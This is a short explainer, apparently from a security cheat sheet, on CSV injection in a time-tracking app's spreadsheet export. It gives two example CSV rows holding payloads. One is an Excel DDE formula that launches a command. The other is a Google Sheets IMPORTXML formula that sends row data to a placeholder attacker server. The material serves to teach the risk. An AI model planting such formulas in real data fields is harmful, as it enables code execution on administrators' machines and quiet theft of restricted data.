# CSV Injection
## Scenario
Imagine a time or ticket tracking app. Users enter their time (or tickets) but cannot view those of other users. A site administrator then comes along and exports entries to a csv file, opening it up in a spreadsheet application. Pretty standard stuff.

## Attack Vector 1: Code Execution (Excel)
Even though that cell was quoted it seems to have been interpreted as a formula just because the first character was an `=` symbol. In fact - in Excel at least - any of the symbols `=`, `-`, `+`, or `@` will trigger this behavior.
Well hold on, a formula is code that executes. So a user can cause code - even if its only formula code - to execute on an administrator’s machine in  their user’s security context.

What if we change our csv file to this then? (Note the Description column on the last line)

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"=2+5+cmd|' /C calc'!A0", 240
```

## Attack Vector 2: Data exfiltration (Google Sheets)
Well recall that while we cannot run macros in Google Sheets, we can absolutely run formulas. And formulas don’t have to be limited to simple arithmetic. In fact, are there any Google Sheets commands available in formulas that can send data elsewhere? Why yes, there seem to be quite a few. But lets take a look at [`IMPORTXML`](https://support.google.com/docs/answer/3093342?hl=en) in particular.

> IMPORTXML(url, xpath\_query)

This will, when it runs, preform an HTTP GET request to the url, then attempt to parse and insert returned data in our spreadsheet. Starting to see it yet?

Well what if our csv file contains:

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")",240
```

The attacker starts the cell with their trusty `=` symbol prefix and then points `IMPORTXML` to a server they control, appending as a querystring of spreadsheet data. Now they can open up their server log and Data that isn’t theirs. [Try it yourself with a Requestbin](https://www.requestbin.com/).

The ultra sinister thing here? No warnings, no popups, no reason to think that anything is amiss. The attacker just enters a similarly formatted time/issue/whatever entry, eventually an administrator attempts to view a CSV export and all that limited-access data is immediately, and queitly sent away.


## References
[The Absurdly Underestimated Dangers of CSV Injection (georgemauer.net)](http://georgemauer.net/2017/10/07/csv-injection.html)